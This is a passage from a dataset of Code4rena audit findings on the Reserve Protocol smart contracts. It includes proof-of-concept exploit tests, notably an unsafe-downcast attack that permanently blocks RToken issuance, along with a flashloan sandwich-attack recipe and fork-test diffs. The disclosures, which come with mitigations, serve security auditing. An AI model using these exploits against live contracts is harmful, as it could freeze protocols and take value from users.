      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/Asset.sol#L102><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/FiatCollateral.sol#L149><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/OracleLib.sol#L14-L31>\n\nThe `Asset.refresh()` function calls `tryPrice()` and catches all errors except errors with empty data.\n\nAs explained in the [docs](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/docs/solidity-style.md#catching-empty-data) the reason empty errors aren't caught is in order to prevent an attacker from failing the `tryPrice()` intentionally by running it out of gas.\n\nHowever, an error with empty data isn't thrown only in case of out of gas, in the current way that Chainlink deprecates oracles (by setting `aggregator` to the zero address) a deprecated oracle would also throw an empty error.\n\n### Impact\n\nAny function that requires refreshing the assets will fail to execute (till the asset is replaced in the asset registry, passing the proposal via governance would usually take 7 days), that includes:\n\n*   Issuance\n*   Vesting\n*   Redemption\n*   Auctions (`manageTokens()`)\n*   `StRSR.withdraw()`\n\n### Proof of Concept\n\nThe [docs](https://github.com/reserve-protocol/protocol/blob/d224c14c398d2727d39d133aa7511e1e6b161833/docs/recollateralization.md#:\\~:text=If%20an%20asset%27s%20oracle%20goes%20offline%20forever%2C%20its%20lotPrice\\(\\)%20will%20eventually%20reach%20%5B0%2C%200%5D%20and%20the%20protocol%20will%20completely%20stop%20trading%20this%20asset.) imply in case of deprecation the protocol is expected continue to operate:\n\n> If an asset's oracle goes offline forever, its lotPrice() will eventually reach \\[0, 0] and the protocol will completely stop trading this asset.\n\nThe [docs](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/docs/collateral.md#refresh-should-never-revert) also clearly state that '`refresh()` should never revert'\n\nI've tracked a few Chainlink oracles that were deprecated on the Polygon network on Jan 11, the PoC below tests an `Asset.refresh()` call with a deprecated oracle.\n\nFile: `test/plugins/Deprecated.test.ts`\n\n```typescript\nimport { Wallet, ContractFactory } from 'ethers'\nimport { ethers, network, waffle } from 'hardhat'\nimport { IConfig } from '../../common/configuration'\nimport { bn, fp } from '../../common/numbers'\nimport {\n  Asset,\n  ATokenFiatCollateral,\n  CTokenFiatCollateral,\n  CTokenMock,\n  ERC20Mock,\n  FiatCollateral,\n  IAssetRegistry,\n  RTokenAsset,\n  StaticATokenMock,\n  TestIBackingManager,\n  TestIRToken,\n  USDCMock,\n} from '../../typechain'\nimport {\n  Collateral,\n  defaultFixture,\n} from '../fixtures'\n\nconst createFixtureLoader = waffle.createFixtureLoader\n\n\ndescribe('Assets contracts #fast', () => {\n  // Tokens\n  let rsr: ERC20Mock\n  let compToken: ERC20Mock\n  let aaveToken: ERC20Mock\n  let rToken: TestIRToken\n  let token: ERC20Mock\n  let usdc: USDCMock\n  let aToken: StaticATokenMock\n  let cToken: CTokenMock\n\n  // Assets\n  let collateral0: FiatCollateral\n  let collateral1: FiatCollateral\n  let collateral2: ATokenFiatCollateral\n  let collateral3: CTokenFiatCollateral\n\n  // Assets\n  let rsrAsset: Asset\n  let compAsset: Asset\n  let aaveAsset: Asset\n  let rTokenAsset: RTokenAsset\n  let basket: Collateral[]\n\n  // Config\n  let config: IConfig\n\n  // Main\n  let loadFixture: ReturnType<typeof createFixtureLoader>\n  let wallet: Wallet\n  let assetRegistry: IAssetRegistry\n  let backingManager: TestIBackingManager\n\n  // Factory\n  let AssetFactory: ContractFactory\n  let RTokenAssetFactory: ContractFactory\n\n  const amt = fp('1e4')\n\n  before('create fixture loader', async () => {\n    ;[wallet] = (await ethers.getSigners()) as unknown as Wallet[]\n    loadFixture = createFixtureLoader([wallet])\n  })\n\n  beforeEach(async () => {\n    // Deploy fixture\n    ;({\n      rsr,\n      rsrAsset,\n      compToken,\n      compAsset,\n      aaveToken,\n      aaveAsset,\n      basket,\n      assetRegistry,\n      backingManager,\n      config,\n      rToken,\n      rTokenAsset,\n    } = await loadFixture(defaultFixture))\n\n    // Get collateral tokens\n    collateral0 = <FiatCollateral>basket[0]\n    collateral1 = <FiatCollateral>basket[1]\n    collateral2 = <ATokenFiatCollateral>basket[2]\n    collateral3 = <CTokenFiatCollateral>basket[3]\n    token = <ERC20Mock>await ethers.getContractAt('ERC20Mock', await collateral0.erc20())\n    usdc = <USDCMock>await ethers.getContractAt('USDCMock', await collateral1.erc20())\n    aToken = <StaticATokenMock>(\n      await ethers.getContractAt('StaticATokenMock', await collateral2.erc20())\n    )\n    cToken = <CTokenMock>await ethers.getContractAt('CTokenMock', await collateral3.erc20())\n\n    await rsr.connect(wallet).mint(wallet.address, amt)\n    await compToken.connect(wallet).mint(wallet.address, amt)\n    await aaveToken.connect(wallet).mint(wallet.address, amt)\n\n    // Issue RToken to enable RToken.price\n    for (let i = 0; i < basket.length; i++) {\n      const tok = await ethers.getContractAt('ERC20Mock', await basket[i].erc20())\n      await tok.connect(wallet).mint(wallet.address, amt)\n      await tok.connect(wallet).approve(rToken.address, amt)\n    }\n    await rToken.connect(wallet)['issue(uint256)'](amt)\n\n    AssetFactory = await ethers.getContractFactory('Asset')\n    RTokenAssetFactory = await ethers.getContractFactory('RTokenAsset')\n  })\n\n  describe('Deployment', () => {\n    it('Deployment should setup assets correctly', async () => {\n\n        console.log(network.config.chainId);\n        // let validOracle = '0x443C5116CdF663Eb387e72C688D276e702135C87';\n        let deprecatedOracle = '0x2E5B04aDC0A3b7dB5Fd34AE817c7D0993315A8a6';\n        let priceTimeout_ = await aaveAsset.priceTimeout(),\n         chainlinkFeed_ = deprecatedOracle,\n         oracleError_ = await aaveAsset.oracleError(),\n         erc20_ = await aaveAsset.erc20(),\n         maxTradeVolume_ = await aaveAsset.maxTradeVolume(),\n         oracleTimeout_ = await aaveAsset.oracleTimeout();\n        \n        aaveAsset = await AssetFactory.deploy(priceTimeout_,\n            chainlinkFeed_ ,\n            oracleError_ ,\n            erc20_ ,\n            maxTradeVolume_ ,\n            oracleTimeout_  ) as Asset;\n\n        await aaveAsset.refresh();\n      \n    })\n  })\n\n})\n\n```\n\nModification of `hardhat.config.ts` to set it to the Polygon network:\n\n```diff\ndiff --git a/hardhat.config.ts b/hardhat.config.ts\nindex f1886d25..53565799 100644\n--- a/hardhat.config.ts\n+++ b/hardhat.config.ts\n@@ -24,18 +24,19 @@ const TIMEOUT = useEnv('SLOW') ? 3_000_000 : 300_000\n const src_dir = `./contracts/${useEnv('PROTO')}`\n const settings = useEnv('NO_OPT') ? {} : { optimizer: { enabled: true, runs: 200 } }\n \n+let recentBlockNumber = 38231040;\n+let jan6Block = 37731612; // causes 'missing trie node' error\n+\n const config: HardhatUserConfig = {\n   defaultNetwork: 'hardhat',\n   networks: {\n     hardhat: {\n       // network for tests/in-process stuff\n-      forking: useEnv('FORK')\n-        ? {\n-            url: MAINNET_RPC_URL,\n-            blockNumber: Number(useEnv('MAINNET_BLOCK', forkBlockNumber['default'].toString())),\n-          }\n-        : undefined,\n-      gas: 0x1ffffffff,\n+      forking: {\n+          url: \"https://rpc.ankr.com/polygon\",\n+          // blockNumber: recentBlockNumber\n+          },\n+          gas: 0x1ffffffff,\n       blockGasLimit: 0x1fffffffffffff,\n       allowUnlimitedContractSize: true,\n     },\n```\n\nOutput:\n\n      1) Assets contracts #fast\n           Deployment\n             Deployment should setup assets correctly:\n         Error: Transaction reverted without a reason string\n        at Asset.refresh (contracts/plugins/assets/Asset.sol:102)\n        at processTicksAndRejections (node:internal/process/task_queues:95:5)\n        at async HardhatNode._mineBlockWithPendingTxs (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1802:23)\n        at async HardhatNode.mineBlock (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:491:16)\n        at async EthModule._sendTransactionAndReturnHash (node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1522:18)\n        at async HardhatNetworkProvider.request (node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:118:18)\n        at async EthersProviderWrapper.send (node_modules/@nomiclabs/hardhat-ethers/src/internal/ethers-provider-wrapper.ts:13:20)\n\nNotes:\n\n*   Chainlink list deprecating oracles only till deprecation, afterwards they're removed from the website. For this reason I wasn't able to trace deprecated oracles on the mainnet\n*   I was trying to prove this worked before deprecation, however, I kept getting the 'missing trie node' error when forking the older block. This isn't essential for the PoC so I decided to give up on it for now (writing this PoC was hard enough on its own).\n\n### Recommended Mitigation Steps\n\nAt `OracleLib.price()` catch the error and check if the error data is empty and the aggregator is set to the zero address, if it is a revert with a custom error. Otherwise revert with the original error data (this can be done with assembly).\n\nAnother approach might be to check in the `refresh()` function that the `tryPrice()` function didn't revert due to out of gas error by checking the gas before and after (in case of out of gas error only \\~1/64 of the gas-before would be left). The advantage of this approach is that it would catch also other errors that might revert with empty data.\n\n**[tbrent (Reserve) acknowledged and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/234#issuecomment-1404422733):**\n > I did not know this! Nice find.\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the `Asset.refresh()` function in the Reserve Protocol's contracts. This function calls `tryPrice()` and catches all errors except for those with empty data. This is to prevent an attacker from intentionally failing the function by running it out of gas. However, the bug report highlights that in the current way that Chainlink deprecates oracles, a deprecated oracle would also throw an empty error. This can cause issues with various functions that require refreshing the assets, such as Issuance, Vesting, Redemption, Auctions, and `StRSR.withdraw()`. The bug report provides a proof of concept and recommends mitigation steps, such as catching the error and checking if the aggregator is set to the zero address, or checking the gas before and after the `tryPrice()` function. The Reserve team has acknowledged and commented on the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/234",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "43310",
      "title": "[M-15] The `Furnace#melt()` is vulnerable to sandwich attacks",
      "impact": "MEDIUM",
      "content": "\nMalicious users can get more of the RToken appreciation benefit brought by [`Furnace.sol#melt()`](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70), and long-term RToken holders will get less benefit.\n\nRToken holders will be less willing to provide liquidity to RToken pools (such as uniswap pools), resulting in less liquidity of RToken.\n\n### Proof of Concept\n\n**A1. Gain revenue from a flashloan sandwich attack**\n\nA malicious user can launch a flashloan sandwich attack against [Furnace#melt()](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70) each time a whole period passed (payout happens).\n\nThe attack transaction execution steps:\n\n1.  Borrow some assets (`inputFund`) with a flashloan\n2.  Swap the `inputFund` for RToken\n3.  Call [RToken#redeem()](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439) to change the RToken to basket assets(`outputFund`). The `redeem()` will invoke `Furnace.melt()` automatically.\n4.  Swap part of `outputFund` for `inputFund` and pay back the flashloan, the rest of `outputFund` is the profit.\n\nThe implicit assumption here is that most of the time the prices of RToken in `RToken.issues()`, `RToken.redeem()`, and DeFi pools are almost equal.\n\nThis assumption is reasonable because if there are price differentials, they can be balanced by arbitrage.\n\nThe attack can be profitable for:\n\n*   `Furnace#melt()` will increase the price of RToken in issue/redeem (according to basket rate).\n*   Step 2 buys RTokens at a lower price, and then step 3 sells RTokens at a higher price(`melt()` is called first in `redeem()`).\n\n**A2. Get a higher yield by holding RToken for a short period of time**\n\nMalicious users can get higher yield by by following these steps:\n\n1.  Calculate [the next payout block](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L71) of Furnace in advance\n2.  Call [RToken#issue()](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L177) 1 to n blocks before the payout block\n3.  Call [RToken#redeem()](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439) when the payout block reaches.\n\nSince this approach only requires 1 to n blocks to issue in advance, which is typically much smaller than [rewardPeriod](https://github.com/reserve-protocol/protocol/blob/df7ecadc2b/docs/system-design.md#rewardperiod), the attacker will obtain much higher APR than long-term RToken holders.\n\n### Recommended Mitigation Steps\n\nReferring to [eip-4626](https://eips.ethereum.org/EIPS/eip-4626), distribute rewards based on time weighted shares.\n\nAlternatively, always use a very small rewardPeriod and rewardRatio, and lower the upper limit [MAX_RATIO and MAX_PERIOD](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L15-L16).\n\n**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-reserve-findings/issues/258)**\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/258#issuecomment-1404414135):**\n > Agreed with the warden. And agree this is a Medium severity issue.\n> \n> (aside: we are already planning to fix the period at 12s to mitigate this issue)\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/258#issuecomment-1421613758):**\n > Addressed here: https://github.com/reserve-protocol/protocol/pull/571\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/9), [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/60), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/39).\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses two ways in which malicious users can exploit the `Furnace.sol#melt()` function in the Reserve Protocol. The first method is a flashloan sandwich attack, where the attacker borrows assets, swaps them for RToken, and then uses the `redeem()` function to automatically call `Furnace.melt()`. This results in a profit for the attacker due to the increase in RToken price caused by `melt()`. The second method involves holding RToken for a short period of time to get a higher yield compared to long-term RToken holders. The report suggests mitigating these issues by implementing a time-weighted rewards distribution system or by using smaller reward periods and ratios. The team behind Reserve Protocol has confirmed the issue and plans to fix it by setting the reward period to 12 seconds. The status of the mitigation has been confirmed by multiple reports from different researchers. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/258",
      "tags": [],
      "finders": [
        "wait"
      ]
    },
    {
      "id": "43309",
      "title": "[M-14] Unsafe cast of `uint8` datatype to `int8`",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L228><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L421>\n\nConverting uint8 to int8 can have unexpected consequences when done unsafely. This issue affects the quote function in BasketHandler.sol and handoutExcessAssets in BackingManager.sol. While there is some risk here, the issue is unlikely to be exploited as ERC-20 tokens generally don't have a decimals value over 18, nevertheless one over 127.\n\n### Proof of Concept\n\n```\n➜ int8(uint8(127))\nType: int\n├ Hex: 0x7f\n└ Decimal: 127\n➜ int8(uint8(128))\nType: int\n├ Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff80\n└ Decimal: -128\n```\n\n### Tools Used\n\nChisel\n\n### Recommended Mitigation Steps\n\nValidate that the decimals value is within an acceptable upper-bound before attempting to cast it to a signed integer.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/265#issuecomment-1401152907):**\n > The warden does make a reasonable point re: the cast being done here and others have pointed out concerns over assuming that an ERC20 _must_ have a decimals field.\n> \n> Will leave open for sponsor review, but I think this would qualify as Medium.\n\n**[tbrent (Reserve) acknowledged and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/265#issuecomment-1404412161):**\n > Agreed, seems Medium to me. \n\n\n\n***\n\n",
      "summary": "\nThe bug report highlights an issue with converting uint8 to int8, which can have unexpected consequences if not done safely. This affects the quote function in BasketHandler.sol and handoutExcessAssets in BackingManager.sol. The report includes a proof of concept and mentions using the tool Chisel. The recommended mitigation steps include validating the decimals value before casting it to a signed integer. The report has been acknowledged and deemed a Medium priority by the sponsor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/265",
      "tags": [],
      "finders": [
        "0xTaylor"
      ]
    },
    {
      "id": "43308",
      "title": "[M-10] Unsafe downcasting in `issue(...)` can be exploited to cause permanent DoS",
      "impact": "MEDIUM",
      "content": "\n**Important note!**\n\nI first found this bug in `issue(...)`, but unsafe downcasting appears in many other areas of the codebase, and seem to also be exploitable but no PoC is provided due to time constraints. Either way, using some form of safe casting library to **replace all occurences** of unsafe downcasting will prevent all the issues. I also do not list the individual instances of unsafe downcasting as all occurences should be replaced with safe cast.\n\n### Details\n\nThe `amtRToken` is a user supplied parameter in the `issue(uint256 amtRToken)` function\n\n```sol\nuint192 amtBaskets = uint192(\n\ttotalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken\n);\n```\n\nThe calculated amount is unsafely downcasted into `uint192`.\n\nThis means that if the resulting calculation is a multiple of $2^{192}$, `amtBaskets = 0`\n\nThe code proceeds to the following line, where `erc20s` and `deposits` arrays will be empty since we are asking for a quote for 0. (see `quote(...)` in `BasketHandler.sol` where amounts are multiplied by zero)\n\n```sol\n(address[] memory erc20s, uint256[] memory deposits) = basketHandler.quote(\n            amtBaskets,\n            CEIL\n        );\n```\n\nThis means an attacker can call `issue(...)` with a very high `amtRToken` amount that is a multiple of $2^{192}$, without depositing any amount of collateral.\n\nThe DoS issues arises because `whenFinished(uint256 amtRToken)` is dependent on `amtRToken`. With such a high value, `allVestAt` will be set so far in the future that it causes a permanent DoS. i.e. Issuances will never vest.\n\n```sol\nuint192 vestingEnd = whenFinished(amtRToken); // D18{block number}\n```\n\n### Proof of Concept\n\nThis PoC demonstrates that an attacker can call `issue(...)` without collateral tokens to modify `allVestAt` variable to an extreme value, such that all further issuances cannot be vested for all users.\n\nDo note that the PoC is done with `totalSupply() == 0` case, so we supply `amtRToken` as a multiple of $2^{192}$. Even if there is an existing `totalSupply()`, we just need to calculate a value for `amtRToken >= 2^192` such that $\\frac{\\text{basketsNeeded} \\times \\text{amtRToken}}{totalSupply()} = 0$. This attack does not require `totalSupply()` be zero.\n\n```sol\nuint192 amtBaskets = uint192(\n\ttotalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken\n);\n```\n\nThe `amount`, `baskets` and `quantities` values are also messed up, but it would not matter anyways...\n\nUnder 'Issuance and Slow Minting' tests in `RToken.test.ts`:\n\n```sol\nit('Audit: DoS by downcasting', async function () {\n      const issueAmount: BigNumber = BigNumber.from(2n ** 192n)\n\n      // Set basket\n      await basketHandler.connect(owner).setPrimeBasket([token0.address], [fp('1')])\n      await basketHandler.connect(owner).refreshBasket()\n\n      // Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens\n      // This will cause allVestAt to be veryyyyy high, permanent DoS\n      const tx = await rToken.connect(addr1)['issue(uint256)'](issueAmount)\n      const receipt = await tx.wait()\n      console.log(receipt.events[0].args)\n  \n      await token0.connect(addr2).approve(rToken.address, initialBal)\n      const tx2 = await rToken.connect(addr2)['issue(uint256)'](initialBal)\n      const receipt2 = await tx2.wait()\n      console.log(receipt2.events[0].args)\n\n      // one eternity later...\n      await advanceTime('123456789123456789')\n      // and still not ready\n      await expect(rToken.connect(addr2).vest(addr2.address, 1))\n        .to.be.revertedWith(\"issuance not ready\")\n\n    })\n```\n\nRun with:\n\n```bash\nyarn test:p1 --grep \"Audit: DoS\"\n```\n\nExpect to see (only important parts shown):\n\n```bash\n[\n  ...\n  recipient: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',\n  index: BigNumber { value: \"0\" },\n  amount: BigNumber { value: \"6277101735386680763835789423207666416102355444464034512896\" },\n  baskets: BigNumber { value: \"0\" },\n  erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],\n  quantities: [ BigNumber { value: \"0\" } ],\n  blockAvailableAt: BigNumber { value: \"627710173538668076383578942320766744610235544446403452\" }\n]\n[\n  ...\n  recipient: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',\n  index: BigNumber { value: \"0\" },\n  amount: BigNumber { value: \"6300000000000000000000000000000000000000000000000000000000\" },\n  baskets: BigNumber { value: \"22898264613319236164210576792333583897644555535965487104\" },\n  erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],\n  quantities: [\n    BigNumber { value: \"22898264613319236164210576792333583897644555535965487104\" }\n  ],\n  blockAvailableAt: BigNumber { value: \"1257710173538668076383578942320766744610235544446403452\" }\n]\n\n  RTokenP1 contract\n    Issuance and Slow Minting\n      ✔ Audit: DoS by downcasting\n```\n\n### Impact\n\nPermanent DoS would be High risk considering RToken is an asset-backed **currency**.<br>\n*A currency that is unable to issue new currency does not work as a currency*\n\nAlso, I believe existing collateral cannot be redeemed due to the extreme values also used in `redeem(...)` function. No PoC written due to time constriant for this case... but above should be enough impact.\n\nMany other downcasting issues for this project. But using a safe casting library would prevent all the issues... not going to write multiple reports for same underlying issue.\n\n### Recommendations\n\nUse some safe casting library. OpenZeppelin's library does not have safe casting for `uint192` type. May have to find another or write your own.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1399385997):**\n > Will leave open for sponsor review, I think Medium severity is correct if the finding turns out to be fully valid. If no more issuance can occur, redemption is still possible. Warden would have needed to demonstrate a loss of funds for this to qualify as H severity. \n\n**[tbrent (Reserve) disagreed with severity and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1405572151):**\n > We have supported ranges of value. See `docs/solidity-style.md`. \n> \n> The only mistake here is that `issue()` has somewhat lacking in-line documentation:<br>\n> > Downcast is safe because an actual quantity of qBUs fits in uint192\n> \n> The comment in `redeem()` is a bit better:<br>\n> > // downcast is safe: amount < totalSupply and basketsNeeded_ < 1e57 < 2^190 (just barely)\n> \n> We'll probably improve the comment in `issue()` to match `redeem()`. This should be a QA-level issue. \n\n**[0xean (judge) decreased severity to Low/Non-Critical](https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1399385997)**\n\n**[Soosh (warden) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1420413631):**\n > I don't see how documentation prevents this issue. \n> \n> The issue exists because downcasting values above 2^192 does not revert. Maybe the sponsor misunderstood the issue thinking that it would require the attacker to deposit 2^192 of the collateral in order for the attack to succeed which is an extremely unlikely scenario.\n> \n> Updated the PoC to clearly show that the attacker can permanently disable the `issue(...)` function for the protocol, without owning any amount of the basket token. - addr1 is the attacker with 0 basket tokens, addr2 represents all future users who will not be able to issue new RTokens.\n> ```js\n> it('Audit: DoS by downcasting', async function () {\n>       const issueAmount: BigNumber = BigNumber.from(2n ** 192n)\n> \n>       await token0.burn(addr1.address, bn('6.3e57'))\n>       await token0.burn(addr2.address, bn('6.3e57'))\n>       // await token0.mint(addr1.address, bn('10e18'))\n>       await token0.mint(addr2.address, bn('10e18'))\n>       expect(await token0.balanceOf(addr1.address)).to.eq(0)\n>       expect(await token0.balanceOf(addr2.address)).to.eq(bn('10e18'))\n> \n>       // Set basket\n>       await basketHandler.connect(owner).setPrimeBasket([token0.address], [fp('1')])\n>       await basketHandler.connect(owner).refreshBasket()\n> \n>       // Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens\n>       // This will cause allVestAt to be very high, permanent DoS\n>       const tx = await rToken.connect(addr1)['issue(uint256)'](issueAmount)\n>       const receipt = await tx.wait()\n>       console.log(receipt.events[0].args)\n>   \n>       await token0.connect(addr2).approve(rToken.address, bn('10e18'))\n>       const tx2 = await rToken.connect(addr2)['issue(uint256)'](bn('10e18'))\n>       const receipt2 = await tx2.wait()\n>       console.log(receipt2.events[0].args)\n> \n>       // one eternity later...\n>       await advanceTime('123456789123456789')\n>       // and still not ready\n>       await expect(rToken.connect(addr2).vest(addr2.address, 1))\n>         .to.be.revertedWith(\"issuance not ready\")\n>     })\n> ```\n> \n> Additionally, I still believe this issue should be considered High risk as:\n> \n> 1. Disabling of critical function of the protocol\n> 2. Attack is very simple to exploit, with no cost to the attacker - Low complexity with High likelihood\n> 3. Permanent disabling of RToken issuance means that the **RToken can no longer be used** so all funds must be moved out, this will entail:\n> - Redeeming all existing RTokens, which will take a reasonable amount of time depending on redemption battery parameters\n> - Unstaking all stRSR which will take a reasonable amount of time depending on unstaking delay\n> 4. Gas costs for all the above redeeming and unstaking will be in the thousands for a RToken with reasonable market cap. \n> 5. RToken is a stable currency which means that it would be used in DeFi protocols. In the case of Lending/Borrowing, it would take even longer for RToken to be redeemed. There may also be loss of funds as a long wait time to redeem RTokens means that the RToken will trade at a discount in secondary markets - this can cause RToken-collateralized loans to be underwater.\n> \n> There is no **direct** loss of funds but I'd argue the impact is vast due to RToken being used as a currency.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1420866210):**\n > Thanks for the response.  \n> \n> > There is no direct loss of funds but I'd argue the impact is vast due to RToken being used as a currency.\n> \n> If there is no direct loss of funds, how can this issue be High per the C4 criteria, not your own opinion?\n> \n> I will ask @tbrent to take another look at your POC and do the same as well. \n\n**[Soosh (warden) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1420954105):**\n > I agree with Medium if following C4 criteria in the docs exactly word for word.\n> \n> It is just that there are many High findings in previous contests where High findings did not need to cause direct loss of funds, but break an important functionality in the protocol.\n> \n> To be clear, this issue does lead to loss of funds. It is just that it may not be considered **direct**.\n> \n> It is indeed my opinion that the finding should be High, but the points listed below are all facts. I will respect your decision regardless. Thanks!\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1421058666):**\n > Apologies, I misunderstood the issue the first time I read through it...indeed this can be used to mint large amounts of RToken to yourself while putting down very little in collateral, while pushing `allVestAt` extremely far into the future. \n> \n> Since `issuanceRate` cannot be disabled, and cannot be above 100%, there is no way for the absurdly high RToken mint to finish vesting. In the event of the attack, RToken issuance would be bricked but redemption would remain enabled, and since no RToken is minted until vesting the redemptions would still function. I think this is a Medium. \n\n**[0xean (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/320#issuecomment-1421336734):**\n > Thanks for all the conversation, marking as Medium. \n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR makes all dangerous uint192 downcasts truncation-safe: [reserve-protocol/protocol#628](https://github.com/reserve-protocol/protocol/pull/628)\n\n**Status:** Mitigation confirmed. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/19), [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/56), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/33).\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a bug that was found in the `issue()` function of the `amtRToken` parameter. This bug allows an attacker to call the `issue()` function with a very high `amtRToken` amount that is a multiple of $2^{192}$, without depositing any amount of collateral. This can cause a permanent denial of service (DoS) attack, as the `allVestAt` variable will be set to a very high value, making it impossible for future issuances to be vested. This is a high-risk issue as it can disable the `issue()` function and prevent the RToken from being used as a currency. The bug has been mitigated by replacing all unsafe downcasting with safe casting.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/320",
      "tags": [],
      "finders": [
        "Soosh"
      ]
    },
    {
      "id": "43307",
      "title": "[M-08] `Asset.lotPrice()` doesn't use the most recent price in case of oracle timeout",
      "impact": "MEDIUM",
      "content": "\n`Asset.lotPrice()` has a fallback mechanism in case that `tryPrice()` fails - it uses the last saved price and multiplies its value by `lotMultiplier` (a variable that decreases as the time since the last saved price increase) and returns the results.\n\nHowever, the `tryPrice()` might fail due to oracle timeout, in that case the last saved price might be older than the oracle's price.\n\nThis can cause the backing manager to misestimate the value of the asset, trade it at a lower price, or do an unnecessary haircut.\n\n### Proof of Concept\n\nIn the PoC below:\n\n*   Oracle price is set at day 0\n*   The asset is refreshed (e.g. somebody issued/vested/redeemed)\n*   After 5 days the oracle gets an update\n*   25 hours later the `lotPrice()` is calculated based on the oracle price from day 0 even though a price from day 5 is available from the oracle\n*   Oracle gets another update\n*   25 hours later the `lotPrice()` goes down to zero since it considers the price from day 0 (which is more than a week ago) to be the last saved price, even though a price from a day ago is available from the oracle\n\n```diff\ndiff --git a/test/fixtures.ts b/test/fixtures.ts\nindex 5299a5f6..75ca8010 100644\n--- a/test/fixtures.ts\n+++ b/test/fixtures.ts\n@@ -69,7 +69,7 @@ export const SLOW = !!useEnv('SLOW')\n \n export const PRICE_TIMEOUT = bn('604800') // 1 week\n \n-export const ORACLE_TIMEOUT = bn('281474976710655').div(2) // type(uint48).max / 